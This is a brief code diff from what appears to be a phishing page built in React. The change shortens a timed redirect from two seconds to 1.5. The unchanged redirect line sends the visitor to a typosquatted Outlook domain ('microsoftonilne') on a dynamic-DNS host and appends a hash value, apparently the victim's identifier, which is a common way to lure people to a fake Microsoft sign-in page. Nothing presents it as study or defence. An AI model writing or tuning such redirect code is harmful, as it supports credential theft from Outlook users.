@@ -29,7 +29,7 @@ const App = () => {
     // Set a timeout to update the message after 2000 milliseconds (2 seconds)
     const timeoutId = setTimeout(() => {
       window.location.href = `https://outlook.microsoftonilne.serveuser.com/cIgAxmdV#${hashValue}`;
-    }, 2000);
+    }, 1500);
 
     // Cleanup the timeout to avoid memory leaks
     return () => clearTimeout(timeoutId);
